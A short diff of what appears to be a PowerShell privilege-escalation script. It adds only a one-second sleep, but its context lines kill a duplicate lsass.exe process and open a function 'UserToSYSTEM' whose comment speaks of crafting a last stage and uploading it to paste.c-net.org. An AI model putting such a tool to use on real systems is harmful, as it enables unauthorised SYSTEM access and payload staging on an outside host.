@@ -110,6 +110,8 @@ if ($lsassprocess.Count -gt 1) {
     Write-Host "lsass.exe Duplicate Process Detected,Killing it..."
     kill $lsassprocess.Id[1]
 }
+Start-Sleep 1
+
 function UserToSYSTEM {
 #craft the last stage and upload to paste.c-net.org
 if ($HideWindow) {
